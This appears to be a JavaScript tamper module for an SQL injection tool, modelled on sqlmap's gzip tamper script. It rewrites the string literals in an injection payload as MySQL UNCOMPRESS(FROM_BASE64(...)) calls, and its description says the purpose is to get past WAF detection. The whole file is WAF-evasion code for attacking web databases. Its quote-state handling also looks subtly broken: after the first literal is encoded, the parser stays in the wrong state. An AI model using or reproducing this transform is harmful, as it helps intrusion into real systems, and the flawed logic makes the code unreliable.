// Gzip 编码：将字符串字面量用 zlib（deflate）压缩后再编码（对标 sqlmap gzip.py 的实际产物格式）
// MySQL UNCOMPRESS() 期望的是 zlib 容器（RFC1950，0x78 前缀），而非 gzip 容器（RFC1952，0x1f8b 前缀）——
// 早期实现误用 gzipSync 导致 UNCOMPRESS() 报错「Invalid data」，已修正为 deflateSync。
import { deflateSync } from 'node:zlib';

export const gzip = {
  name: 'gzip',
  description: '将字符串字面量 zlib(deflate) 压缩后用 UNCOMPRESS() 解压，绕过 WAF 检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const src = String(payload ?? '');
    let out = '';
    let inSingle = false, inDouble = false;
    for (let i = 0; i < src.length; i++) {
      const ch = src[i], prev = src[i - 1];
      if (inSingle) {
        if (ch === "'" && prev !== '\\') { inSingle = false; out += ch; }
        else out += ch;
        continue;
      }
      if (inDouble) {
        if (ch === '"' && prev !== '\\') { inDouble = false; out += ch; }
        else out += ch;
        continue;
      }
      if (ch === "'") {
        inSingle = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === "'" && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = deflateSync(Buffer.from(str)).toString('base64');
        out += `UNCOMPRESS(FROM_BASE64('${compressed}'))`;
      } else if (ch === '"') {
        inDouble = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === '"' && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = deflateSync(Buffer.from(str)).toString('base64');
        out += `UNCOMPRESS(FROM_BASE64('${compressed}'))`;
      } else {
        out += ch;
      }
    }
    return out;
  },
};
export default gzip;
